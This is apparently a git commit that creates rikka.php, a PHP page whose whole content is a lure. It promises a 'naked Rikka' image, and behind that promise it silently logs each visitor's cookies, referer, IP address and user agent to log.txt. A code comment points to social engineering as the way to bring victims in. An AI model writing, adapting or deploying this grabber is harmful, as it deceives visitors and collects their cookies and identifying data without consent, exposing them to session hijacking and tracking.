6fbd60f353c5ad267d9366f26b16ced2b7aef312
sinkaroid <bibsindra@gmail.com>
2019-03-06 11:01:25 +0700

    Create rikka.php

---
+++ rikka.php
@@ -0,0 +1,18 @@
+<?php
+// your soc needed here
+echo'<center><h1>Click image to see naked Rikka</h1><br>
+<a href="https://sinkaroid.org/labs/avatar/rikkan.jpg">
+<img src="https://sinkaroid.org/labs/avatar/rikka.jpg"width="380" height="550"></a>';
+
+// extract
+$data = array(
+    "cookie"        => $_SERVER['HTTP_COOKIE'], 
+    "referer"       => $_SERVER['HTTP_REFERER'], 
+    "remote_addr"   => $_SERVER['REMOTE_ADDR'], 
+    "user_agent"    => $_SERVER['HTTP_USER_AGENT']
+);
+
+$open = fopen('log.txt', 'a+');
+fwrite($open, implode("\r\n", $data)."\n\n");
+fclose($open);
+?>
